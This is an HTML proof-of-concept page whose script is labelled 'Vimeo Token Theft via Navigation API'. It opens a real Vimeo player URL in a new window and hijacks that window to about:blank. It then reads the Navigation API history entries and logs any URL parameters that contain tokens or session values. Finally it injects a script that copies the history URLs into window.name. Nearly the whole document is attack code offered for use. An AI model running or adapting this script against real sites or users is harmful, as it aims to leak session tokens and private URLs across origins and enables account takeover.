<!DOCTYPE html>
<html>
<head>
    <title>Vimeo Navigation API History Leak</title>
</head>
<body>
    <h1>üö® Vimeo Token Theft via Navigation API</h1>
    <button onclick="attack()">Start Attack</button>
    <div id="log"></div>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
            console.log(msg);
        }

        function attack() {
            log('üéØ Step 1: Opening Vimeo player in new window...');
            
            // Open Vimeo player
            const vimeoWin = window.open(
                'https://player.vimeo.com/video/935884964',
                'vimeoTarget'
            );
            
            // Wait for it to load
            setTimeout(() => {
                log('üì° Step 2: Hijacking window to about:blank...');
                
                // Change to about:blank (changes ownership!)
                vimeoWin.location = 'about:blank';
                
                setTimeout(() => {
                    log('üîç Step 3: Extracting navigation history...');
                    
                    try {
                        // Check if Navigation API is available
                        if (vimeoWin.navigation && vimeoWin.navigation.entries) {
                            const entries = vimeoWin.navigation.entries();
                            
                            log(`‚úÖ Found ${entries.length} history entries`);
                            
                            // Extract URLs from history
                            entries.forEach((entry, i) => {
                                const url = new URL(entry.url);
                                log(`Entry ${i}: ${url.href}`);
                                
                                // Check if URL contains tokens
                                // Sometimes tokens are in URL fragments or query params
                                if (url.hash.includes('token') || 
                                    url.search.includes('token') ||
                                    url.search.includes('session')) {
                                    log(`üö® POTENTIAL TOKEN IN URL: ${url.href}`);
                                }
                                
                                // Extract any query parameters
                                url.searchParams.forEach((value, key) => {
                                    log(`  ${key}: ${value}`);
                                });
                            });
                            
                            // Try to access navigation state
                            if (vimeoWin.navigation.currentEntry) {
                                const state = vimeoWin.navigation.currentEntry.getState();
                                log('Navigation state:', JSON.stringify(state));
                            }
                            
                            // CRITICAL: Try to read window.name
                            log('Window name:', vimeoWin.name);
                            
                            // CRITICAL: Try to inject script to extract playerConfig
                            tryExtractConfig(vimeoWin);
                            
                        } else {
                            log('‚ùå Navigation API not available');
                        }
                    } catch(e) {
                        log('‚ùå Error: ' + e.message);
                    }
                }, 2000);
            }, 3000);
        }
        
        function tryExtractConfig(win) {
            try {
                // We now own this window, so we can inject script!
                const script = win.document.createElement('script');
                script.textContent = `
                    // This script runs with about:blank origin
                    // But navigation.entries() leaked the Vimeo URLs!
                    
                    // Try to navigate back to Vimeo
                    if (window.navigation && window.navigation.entries().length > 0) {
                        // Store what we want to extract in window.name
                        window.name = JSON.stringify({
                            historyUrls: window.navigation.entries().map(e => e.url)
                        });
                        
                        // Navigate back to the first entry
                        window.history.back();
                    }
                `;
                win.document.head.appendChild(script);
                
                log('‚úÖ Injected script into hijacked window');
                
                // After navigating back, check window.name again
                setTimeout(() => {
                    log('Window name after back:', win.name);
                }, 3000);
                
            } catch(e) {
                log('‚ùå Script injection failed: ' + e.message);
            }
        }
    </script>
</body>
</html>
